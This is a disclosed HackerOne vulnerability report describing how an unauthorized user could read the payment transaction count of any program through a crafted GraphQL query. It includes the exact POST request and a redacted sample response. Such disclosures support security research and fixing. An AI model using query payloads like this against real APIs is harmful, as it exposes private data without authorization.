# Disclosure of `payment_transactions` for programs via GraphQL query

## Report Details
- **Report ID**: 707433
- **URL**: https://hackerone.com/reports/707433
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-04T05:27:30.442Z
- **Disclosed**: 2019-12-01T18:13:59.537Z

## Reporter
- **Username**: msdian7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
payment transactions count of programs exposed

**Description:**
payment transactions details can be only accessed by program team members, but there is an flaw, with that, an unauthorized user can get payment transactions count of any program (i have confirmed only with public program)

### Steps To Reproduce

1.) Execute the below graphql

POST /graphql? HTTP/1.1
Host: hackerone.com

{"query":"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,base_bounty,payment_transactions{total_count}}","variables":{"handle_0":"████","size_1":"small"}}


2.)  you will get below response 

{"data":{"team":{"id":"█████████","name":"███████","about":"█████████","_profile_picturePkPpF":"█████████","offers_swag":true,"offers_bounties":true,"base_bounty":null,"payment_transactions":{"total_count":9}}}}


3.)  done, payment transactions count of ████ is 9

## Impact

Unauthorized user can get private data

## Attachments
No attachments
